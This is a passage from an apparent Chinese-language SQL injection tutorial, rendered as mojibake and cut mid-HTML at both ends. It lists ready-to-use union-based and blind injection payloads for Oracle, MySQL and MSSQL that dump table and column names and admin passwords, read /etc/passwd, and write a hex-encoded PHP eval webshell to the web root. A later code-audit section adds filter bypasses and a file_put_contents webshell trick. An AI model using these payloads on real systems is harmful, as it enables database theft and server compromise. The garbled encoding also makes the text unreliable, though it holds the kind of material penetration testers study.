<td>BEGIN DBMS_LOCK.SLEEP(5);END; --(ä»… PL/SQL æ³¨å…¥) UTL_INADDR.get_host_name() UTL_INADDR.get_host_address() UTL_HTTP.REQUEST()</td>
</tr>
<tr class="odd">
<td>IF è¯­å¥</td>
<td>If (1=1) select â€˜Aâ€™ else select â€˜Bâ€™</td>
<td>SELECT if(1=1,â€™Aâ€™,â€™Bâ€™)</td>
<td>/</td>
</tr>
</tbody>
</table>
<p>â€‹ <em>PSï¼šSQLMAP é’ˆå¯¹ Oracle æ³¨å…¥æ—¶ï¼Œä½¿ç”¨äº†æ¯”è¾ƒè´¹è§£çš„ SUBSTRC,å¥½å¤šæ—¶å€™å¾—ä¸­è½¬æ›´æ”¹ä¸º SUBSTR.</em></p>
<h3 id="x04-æ‰‹å·¥æ³¨å…¥">0x04 æ‰‹å·¥æ³¨å…¥</h3>
<h4 id="åº”ç”¨åœºæ™¯">åº”ç”¨åœºæ™¯</h4>
<ol type="1">
<li>å¿«é€ŸéªŒè¯ï¼ˆæ¦‚å¿µæ€§è¯æ˜ï¼‰</li>
<li>å·¥å…·è·‘ä¸å‡ºæ¥äº†
<ol type="1">
<li>çš„ç¡®æ˜¯æ³¨å…¥ï¼Œä½†ä¸å‡ºæ•°æ®</li>
<li>ç‰¹å¾ä¸è§„å¾‹ï¼ŒæŒ–æ˜è§„å¾‹ï¼Œå®šåˆ¶è„šæœ¬</li>
</ol></li>
<li>ç»•è¿‡è¿‡æ»¤
<ol type="1">
<li>æœ‰ WAFï¼Œæ‰‹å·¥æ³¨å…¥</li>
<li>æœ‰è¿‡æ»¤ï¼Œæç»•è¿‡</li>
</ol></li>
<li>ç›²æ³¨ç±»</li>
</ol>
<h4 id="å¸¸ç”¨è¯­å¥">å¸¸ç”¨è¯­å¥</h4>
<p>åˆ¤å®šæ³¨å…¥ =&gt; åŸºç¡€ä¿¡æ¯ =&gt; å¯æ˜¾å­—æ®µ =&gt; çˆ†åº“ =&gt; çˆ†è¡¨ =&gt; çˆ†å†…å®¹</p>
<ol type="1">
<li><p>Oracle</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">oder <span class="hljs-keyword">by</span> N<br># çˆ†å‡ºç¬¬ä¸€ä¸ªæ•°æ®åº“å<br><span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> banner <span class="hljs-keyword">from</span> sys.v_ <span class="hljs-keyword">where</span> rownum=<span class="hljs-number">1</span>),<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span> <span class="hljs-keyword">from</span> dual<br># ä¾æ¬¡çˆ†å‡ºæ‰€æœ‰æ•°æ®åº“å,å‡è®¾ç¬¬ä¸€ä¸ªåº“åä¸º first_dbname<br><span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">owner</span> <span class="hljs-keyword">from</span> all_tables <span class="hljs-keyword">where</span> rownum=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">owner</span>&lt;&gt;<span class="hljs-string">&#x27;first_dbname&#x27;</span>),<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span> <span class="hljs-keyword">from</span> dual<br>çˆ†å‡ºè¡¨å<br><span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> user_tables <span class="hljs-keyword">where</span> rownum=<span class="hljs-number">1</span>),<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span> <span class="hljs-keyword">from</span> dual<br>åŒç†,åŒçˆ†å‡ºä¸‹ä¸€ä¸ªæ•°æ®åº“ç±»ä¼¼çˆ†å‡ºä¸‹ä¸€ä¸ªè¡¨åå°±ä¸è¯´äº†,ä½†æ˜¯å¿…é¡»æ³¨æ„è¡¨åç”¨å¤§å†™æˆ–è€…è¡¨åå¤§å†™çš„åå…­è¿›åˆ¶ä»£ç ã€‚<br>æœ‰æ—¶å€™æˆ‘ä»¬åªæƒ³è¦æŸä¸ªæ•°æ®åº“ä¸­å«å¯†ç å­—æ®µçš„è¡¨å,é‡‡ç”¨æ¨¡ç³ŠæŸ¥è¯¢è¯­å¥ï¼Œå¦‚ä¸‹ï¼š<br><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> user_tab_columns <span class="hljs-keyword">where</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%25pass%25&#x27;</span>)&lt;<span class="hljs-number">0</span><br>çˆ†å‡ºè¡¨ tablename ä¸­çš„ç¬¬ä¸€ä¸ªå­—æ®µå<br><span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> user_tab_columns <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;tablename&#x27;</span> <span class="hljs-keyword">and</span> rownum=<span class="hljs-number">1</span>),<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span> <span class="hljs-keyword">from</span> dual<br>ä¾æ¬¡ä¸‹ä¸€ä¸ªå­—æ®µå<br><span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> user_tab_columns <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;tablename&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">column_name</span>&lt;&gt;<span class="hljs-string">&#x27;first_col_name&#x27;</span> <span class="hljs-keyword">and</span> rownum=<span class="hljs-number">1</span>),<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span> <span class="hljs-keyword">from</span> dual<br><br>è‹¥ä¸ºåŸºäºæ—¶é—´æˆ–è€…åŸºäº <span class="hljs-type">bool</span> ç±»å‹ç›²æ³¨ï¼Œå¯ç»“åˆ substr ã€ASCII è¿›è¡Œèµ‹å€¼ç›²æµ‹ã€‚<br>è‹¥å±è”½å…³é”®å‡½æ•°ï¼Œå¯å°è¯• SYS_CONTEXT(<span class="hljs-string">&#x27;USERENV&#x27;</span>,<span class="hljs-string">&#x27;CURRENT_USER&#x27;</span>)ç±»ç”¨æ³•ã€‚<br></code></pre></td></tr></table></figure></li>
<li><p>Mysql</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#æ­£å¸¸è¯­å¥</span><br><span class="hljs-attribute">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">192</span>.<span class="hljs-number">128</span>/sqltest/news.php?id=<span class="hljs-number">1</span><br><span class="hljs-comment">#åˆ¤æ–­å­˜åœ¨æ³¨å…¥å¦</span><br><span class="hljs-attribute">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">192</span>.<span class="hljs-number">128</span>/sqltest/news.php?id=<span class="hljs-number">1</span> and <span class="hljs-number">1</span>=<span class="hljs-number">2</span><br><span class="hljs-comment">#ç¡®å®šå­—æ®µæ•° order by</span><br><span class="hljs-attribute">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">192</span>.<span class="hljs-number">128</span>/sqltest/news.php?id=-<span class="hljs-number">1</span> order by <span class="hljs-number">3</span><br><span class="hljs-comment">#æµ‹è¯•å›æ˜¾å­—æ®µ</span><br><span class="hljs-attribute">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">192</span>.<span class="hljs-number">128</span>/sqltest/news.php?id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><br><span class="hljs-comment">#æµ‹è¯•å­—æ®µå†…å®¹</span><br><span class="hljs-attribute">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">192</span>.<span class="hljs-number">128</span>/sqltest/news.php?id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,user(),<span class="hljs-number">3</span><br><span class="hljs-attribute">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">192</span>.<span class="hljs-number">128</span>/sqltest/news.php?id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,group_concat(user(),<span class="hljs-number">0</span>x5e5e,version(),<span class="hljs-number">0</span>x5e5e,database(),<span class="hljs-number">0</span>x5e5e,@@basedir),<span class="hljs-number">3</span><br><span class="hljs-comment">#æŸ¥è¯¢å½“å‰åº“ä¸‹æ‰€æœ‰è¡¨</span><br><span class="hljs-attribute">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">192</span>.<span class="hljs-number">128</span>/sqltest/news.php?id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=database()<br><span class="hljs-comment">#æŸ¥è¯¢ admin è¡¨ä¸‹çš„å­—æ®µåï¼ˆ16 è¿›åˆ¶ï¼‰</span><br><span class="hljs-attribute">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">192</span>.<span class="hljs-number">128</span>/sqltest/news.php?id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) from information_schema.columns where table_name=<span class="hljs-number">0</span>x61646d696e<br><span class="hljs-comment">#æŸ¥è¯¢ admin è¡¨ä¸‹çš„ç”¨æˆ·åå¯†ç </span><br><span class="hljs-attribute">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">192</span>.<span class="hljs-number">128</span>/sqltest/news.php?id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(name,<span class="hljs-number">0</span>x5e,pass) from admin<br><span class="hljs-comment">#è¯»å–ç³»ç»Ÿæ–‡ä»¶ï¼ˆ/etc/passwdï¼Œéœ€è½¬æ¢ä¸º 16 è¿›åˆ¶ï¼‰</span><br><span class="hljs-attribute">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">192</span>.<span class="hljs-number">128</span>/sqltest/news.php?id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,load_file(<span class="hljs-number">0</span>x2f6574632f706173737764)<br><span class="hljs-comment">#æ–‡ä»¶å†™å…¥</span><br><span class="hljs-attribute">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">192</span>.<span class="hljs-number">128</span>/sqltest/news.php?id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>x3c3f70687020a6576616c28245f504f53545b615d293ba3f3e into outfile &#x27;/var/www/html/<span class="hljs-number">1</span>.php&#x27;--<br><span class="hljs-attribute">PS</span>ï¼šè‹¥æƒé™ä¸è¶³ï¼Œæ¢ä¸ªç›®å½•<br></code></pre></td></tr></table></figure></li>
<li><p>Mssql</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs gauss">PSï¼šå›æ˜¾å‹è¯·æŸ¥é˜…å‚è€ƒèµ„æ–™çš„é“¾æ¥ï¼Œè¿™é‡Œä¸»è¦ç›²æ³¨çš„è¯­æ³•ã€‚<br><span class="hljs-meta">#çˆ†æ•°æ®åº“ç‰ˆæœ¬ï¼ˆå¯å…ˆæµ‹é•¿åº¦ï¼‰</span><br>aspx?c=c1&#x27;<span class="hljs-comment">/**/</span><span class="hljs-keyword">and</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">ascii</span>(<span class="hljs-built_in">substring</span>(<span class="hljs-comment">@@</span>version,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">67</span><span class="hljs-comment">/**/</span>--&amp;t=<span class="hljs-number">0</span><br>ps:åœ¨èŒƒå›´ç•Œå®šæ—¶ï¼Œå¯åˆ©ç”¨äºŒåˆ†æŸ¥æ‰¾ç»“åˆå¤§äºå°äºæ¥åˆ©ç”¨ï¼›äº¦å¯ç›´æ¥èµ‹å€¼è„šæœ¬çˆ†ç ´ï¼Œä¾æ¬¡ç±»æ¨ç›´è‡³æœ€åä¸€å­—æ¯ã€‚<br><span class="hljs-meta">#çˆ†å½“å‰æ•°æ®åº“åå­—</span><br>aspx?c=c1&#x27;<span class="hljs-comment">/**/</span><span class="hljs-keyword">and</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">ascii</span>(<span class="hljs-built_in">substring</span>(<span class="hljs-built_in">db_name</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">200</span><span class="hljs-comment">/**/</span>--&amp;t=<span class="hljs-number">0</span><br><span class="hljs-meta">#çˆ†è¡¨</span><br>aspx?c=c1&#x27;<span class="hljs-comment">/**/</span><span class="hljs-keyword">and</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">ascii</span>(<span class="hljs-built_in">substring</span>((<span class="hljs-built_in">select</span><span class="hljs-comment">/**/</span>top<span class="hljs-comment">/**/</span><span class="hljs-number">1</span> name<span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>dbname.sys.all_objects <span class="hljs-built_in">where</span> <span class="hljs-built_in">type</span>=&#x27;U&#x27;<span class="hljs-comment">/**/</span>AND<span class="hljs-comment">/**/</span>is_ms_shipped=<span class="hljs-number">0</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">0</span><span class="hljs-comment">/**/</span>--&amp;t=<span class="hljs-number">0</span><br><span class="hljs-meta">#çˆ† user è¡¨å†…å­—æ®µ</span><br>aspx?c=c1&#x27;<span class="hljs-comment">/**/</span><span class="hljs-keyword">and</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">ascii</span>(<span class="hljs-built_in">substring</span>((<span class="hljs-built_in">select</span><span class="hljs-comment">/**/</span>top<span class="hljs-comment">/**/</span> <span class="hljs-number">1</span><span class="hljs-comment">/**/</span>COLUMN_NAME from<span class="hljs-comment">/**/</span>dbname.information_schema.columns<span class="hljs-comment">/**/</span><span class="hljs-built_in">where</span><span class="hljs-comment">/** /TABLE_NAME=&#x27;user&#x27;),1,1))&gt;0/**/</span>--&amp;t=<span class="hljs-number">0</span><br>#çˆ†æ•°æ®<br>aspx?c=c1&#x27;<span class="hljs-comment">/**/</span>and<span class="hljs-comment">/**/</span><span class="hljs-built_in">ascii</span>(<span class="hljs-built_in">substring</span>((<span class="hljs-built_in">select</span><span class="hljs-comment">/**/</span>top<span class="hljs-comment">/**/</span><span class="hljs-number">1</span><span class="hljs-comment">/**/</span>fPwd<span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>User),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">0</span><span class="hljs-comment">/**/</span>--&amp;t=<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure></li>
</ol>
<p><em>PS:å…³äºæ³¨å…¥ç»•è¿‡ï¼ˆbypassï¼‰ï¼Œå†…å®¹åå¤šã€è¿‡ç»†ï¼Œæœ¬æ¬¡æš‚ä¸å½’çº³ã€‚å•ç‹¬ä¸€ç¯‡</em></p>
<h3 id="x05-æ¼æ´æŒ–æ˜">0x05 æ¼æ´æŒ–æ˜</h3>
<ol type="1">
<li><p>é»‘ç›’æµ‹è¯•</p>
<p>å¥—è£…ç»„åˆ</p>
<ol type="1">
<li><p>AWVS ç±» + sqlmap ï¼ˆæ‰‹å·¥ï¼‰</p></li>
<li><p>Burp + sqlmapAPIï¼ˆæ‰‹å·¥ï¼‰</p></li>
<li><p>å‡å°‘ä½“åŠ›æ´»çš„å·¥ç¨‹åŒ–</p>
<ol type="1">
<li><p><a target="_blank" rel="noopener" href="http://zone.wooyun.org/content/21289">Sqli-hunter</a></p></li>
<li><p><a target="_blank" rel="noopener" href="http://zone.wooyun.org/content/24172">GourdScan</a></p></li>
</ol></li>
</ol></li>
<li><p>ä»£ç å®¡è®¡</p>
<p>ç™½ç›’çš„æ–¹å¼æœ‰ä¸¤ç§æµï¼Œä¸€ç§æ˜¯æ£€æŸ¥æ‰€æœ‰è¾“å…¥ï¼Œå¦ä¸€ç§æ˜¯æ ¹æ®å±é™©å‡½æ•°åå‘</p>
<p><a target="_blank" rel="noopener" href="https://www.91ri.org/15074.html">æ³¨å…¥å¼•å‘çš„ç‰¹å¾ç‚¹åŠæ•æ„Ÿå‡½æ•°</a></p>
<p>â€‹</p>
<p><strong>æ¦‚è¦</strong></p>
<ol type="1">
<li>_SERVER æœªè½¬ä¹‰</li>
<li>æ›´æ–°æ—¶æœªé‡æ„æ›´æ–°åºåˆ—</li>
<li>ä½¿ç”¨äº†ä¸€ä¸ªæœªå®šä¹‰çš„å¸¸é‡</li>
<li>PHP è‡ªç¼–æ ‡ç­¾ä¸ strip_tags é¡ºåºé€»è¾‘ç»•è¿‡</li>
<li>å¯æ§å˜é‡è¿›å…¥åŒå¼•å·</li>
<li>å®½å­—èŠ‚è½¬ç¼–ç è¿‡ç¨‹</li>
<li>mysql å¤šè¡¨æŸ¥è¯¢ç»•è¿‡</li>
<li>åˆ«å as+åå¼•å·å¯é—­åˆå…¶åè¯­å¥</li>
<li>mysql çš„ç±»å‹å¼ºåˆ¶è½¬æ¢</li>
<li>è¿‡æ»¤æ¡ä»¶æ˜¯å¦æœ‰ if åˆ¤æ–­è¿›å…¥</li>
<li>å…¨å±€è¿‡æ»¤å­˜åœ¨ç™½åå•</li>
<li>å­—ç¬¦ä¸²æˆªæ–­å‡½æ•°è·å–å®šé•¿æ•°æ®</li>
<li>æ‹¬å·åŒ…è£¹ç»•è¿‡</li>
<li>å¼±ç±»å‹éªŒè¯æœºåˆ¶</li>
<li>WAF æˆ–è€…è¿‡æ»¤äº† and|or çš„æƒ…å†µå¯ä»¥ä½¿ç”¨&amp;&amp;ä¸||è¿›è¡Œç›²æ³¨ã€‚</li>
<li>windows ä¸‹ php ä¸­è®¿é—®æ–‡ä»¶åä½¿ç”¨â€&lt;â€ â€œ&gt;â€å°†ä¼šè¢«æ›¿æ¢æˆâ€*â€ â€œ?â€</li>
<li>äºŒæ¬¡ urldecode æ³¨å…¥</li>
<li>é€»è¾‘å¼•ç”¨äºŒæ¬¡æ³¨å…¥</li>
</ol></li>
</ol>
<p><strong>1.</strong> <code>$_SERVER[â€˜PHP_SELFâ€™]å’Œ $_SERVER[â€˜QUERY_STRINGâ€™]</code>ï¼Œè€Œ $_SERVER å¹¶æ²¡æœ‰è½¬ä¹‰ï¼Œé€ æˆäº†æ³¨å…¥ã€‚</p>
<p><strong>2.</strong> <code>update</code> æ›´æ–°æ—¶æ²¡æœ‰é‡æ„æ›´æ–°åºåˆ—ï¼Œå¯¼è‡´æ›´æ–°å…¶ä»–å…³é”®å­—æ®µï¼ˆé‡‘é’±ã€æƒé™ï¼‰</p>
<figure>
<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SQLæ³¨å…¥å…³è”åˆ†æ-WooYun/1540348928.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload alt="update" /><figcaption aria-hidden="true">update</figcaption>
</figure>
<figure>
<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SQLæ³¨å…¥å…³è”åˆ†æ-WooYun/1540348930.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload alt="update" /><figcaption aria-hidden="true">update</figcaption>
</figure>
<figure>
<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SQLæ³¨å…¥å…³è”åˆ†æ-WooYun/1540348933.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload alt="update" /><figcaption aria-hidden="true">update</figcaption>
</figure>
<p><strong>3.</strong> åœ¨ php ä¸­ å¦‚æœä½¿ç”¨äº†ä¸€ä¸ªæœªå®šä¹‰çš„å¸¸é‡ï¼ŒPHP å‡å®šæƒ³è¦çš„æ˜¯è¯¥å¸¸é‡æœ¬èº«çš„åå­—ï¼Œå¦‚åŒç”¨å­—ç¬¦ä¸²è°ƒç”¨å®ƒä¸€æ ·ï¼ˆCONSTANT å¯¹åº” â€œCONSTANTâ€ï¼‰ã€‚</p>
<p>æ­¤æ—¶å°†å‘å‡ºä¸€ä¸ª E_NOTICE çº§çš„é”™è¯¯</p>
<p>ï¼ˆå‚è€ƒ<a target="_blank" rel="noopener" href="http://php.net/manual/zh/language.constants.syntax.php" class="uri">http://php.net/manual/zh/language.constants.syntax.php</a>ï¼‰</p>
<p><strong>4. </strong> PHP ä¸­è‡ªç¼–å†™å¯¹æ ‡ç­¾çš„è¿‡æ»¤æˆ–å…³é”®å­—è¿‡æ»¤ï¼Œåº”æ”¾åœ¨ strip_tags ç­‰å»é™¤å‡½æ•°ä¹‹åï¼Œå¦åˆ™å¼•èµ·è¿‡æ»¤ç»•è¿‡ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">mystrip_tags</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">remove_xss</span>(<span class="hljs-variable">$string</span>);<br>    <span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">new_html_special_chars</span>(<span class="hljs-variable">$string</span>);<br>    <span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">strip_tags</span>(<span class="hljs-variable">$string</span>);<span class="hljs-comment">//remove_xss åœ¨ strip_tags ä¹‹å‰è°ƒç”¨ï¼Œæ‰€ä»¥å¾ˆæ˜æ˜¾å¯ä»¥åˆ©ç”¨ strip_tags å‡½æ•°ç»•è¿‡,åœ¨å…³é”®å­—ä¸­æ’å…¥ html æ ‡è®°.</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$string</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<figure>
<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SQLæ³¨å…¥å…³è”åˆ†æ-WooYun/1540348935.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload alt="update" /><figcaption aria-hidden="true">update</figcaption>
</figure>
<p><strong>5.</strong> å½“å¯æ§å˜é‡è¿›å…¥åŒå¼•å·ä¸­æ—¶å¯å½¢æˆ webshell å› æ­¤ä»£ç æ‰§è¡Œä½¿ç”¨ï¼Œ<code>$&#123;file_put_contents($_GET[f],$_GET[p])&#125;</code> å¯ä»¥ç”Ÿæˆ webshellã€‚</p>
<figure>
<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SQLæ³¨å…¥å…³è”åˆ†æ-WooYun/1540348937.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload alt="update" /><figcaption aria-hidden="true">update</figcaption>
</figure>
<p><strong>6. </strong> å®½å­—èŠ‚è½¬ç¼–ç è¿‡ç¨‹ä¸­å‡ºç°å®½å­—èŠ‚æ³¨å…¥</p>
<p>PHP è¿æ¥ MySQL æ—¶è®¾ç½® <code>set character_set_client=gbk</code> ,MySQL æœåŠ¡å™¨å¯¹æŸ¥è¯¢è¯­å¥è¿›è¡Œ GBK è½¬ç å¯¼è‡´åæ–œæ  <code>\</code> è¢« <code>%df</code> åƒæ‰ã€‚</p>
<p><strong>7.</strong> æ„é€ æŸ¥è¯¢è¯­å¥æ—¶æ— æ³•åˆ é™¤ç›®æ ‡è¡¨ä¸­ä¸å­˜åœ¨å­—æ®µæ—¶å¯ä½¿ç”¨ mysql å¤šè¡¨æŸ¥è¯¢ç»•è¿‡</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> uid,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> users,adminsï¼›<br>(uid å­˜åœ¨äº usersã€<span class="hljs-keyword">password</span> å­˜åœ¨äº adminsï¼‰<br></code></pre></td></tr></table></figure>
<figure>
<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SQLæ³¨å…¥å…³è”åˆ†æ-WooYun/1540348939.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload alt="update" /><figcaption aria-hidden="true">update</figcaption>
</figure>
<p><strong>8. </strong> mysql ä¸­ï¼ˆåå¼•å·ï¼‰èƒ½ä½œä¸ºæ³¨é‡Šç¬¦ï¼Œä¸”ä¼šè‡ªåŠ¨é—­åˆæœ«å°¾æ²¡æœ‰é—­åˆçš„åå¼•å·ã€‚æ— æ³•ä½¿ç”¨æ³¨é‡Šç¬¦çš„æƒ…å†µä¸‹ä½¿ç”¨åˆ«å as+åå¼•å·å¯é—­åˆå…¶åè¯­å¥ã€‚</p>
<p><strong>9.</strong> mysql çš„ç±»å‹å¼ºåˆ¶è½¬æ¢å¯ç»•è¿‡ PHP ä¸­ empty()å‡½æ•°å¯¹ 0 çš„ false è¿”å›</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">æäº¤/?<span class="hljs-attribute">test</span>=0axxx  -&gt;  empty(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;test&#x27;</span>])  =&gt;  è¿”å›çœŸ<br></code></pre></td></tr></table></figure>
<p>ä½†æ˜¯ mysql ä¸­æäº¤å…¶ 0axxx åˆ°æ•°å­—å‹æ—¶å¼ºåˆ¶è½¬æ¢æˆæ•°å­— 0</p>
<figure>
<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SQLæ³¨å…¥å…³è”åˆ†æ-WooYun/1540348941.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload alt="update" /><figcaption aria-hidden="true">update</figcaption>
</figure>
<p><strong>10.</strong> å­˜åœ¨å…¨å±€è¿‡æ»¤æ—¶è§‚å¯Ÿè¿‡æ»¤æ¡ä»¶æ˜¯å¦æœ‰ if åˆ¤æ–­è¿›å…¥ï¼Œcms å¯èƒ½å­˜åœ¨è‡ªå®šä¹‰ safekey ä¸å¯ç”¨å…¨å±€è¿‡æ»¤ã€‚é€šè¿‡ç¨‹åºé—ç•™æˆ–è€…åŸæœ‰ç•Œé¢è¾“å‡º safekey å¯¼è‡´ç»•è¿‡ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;sy_istemplate&#x27;</span>]!=<span class="hljs-string">&#x27;1&#x27;</span> || <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;sy_safekey&#x27;</span>]).<span class="hljs-variable">$_GET</span>[<span 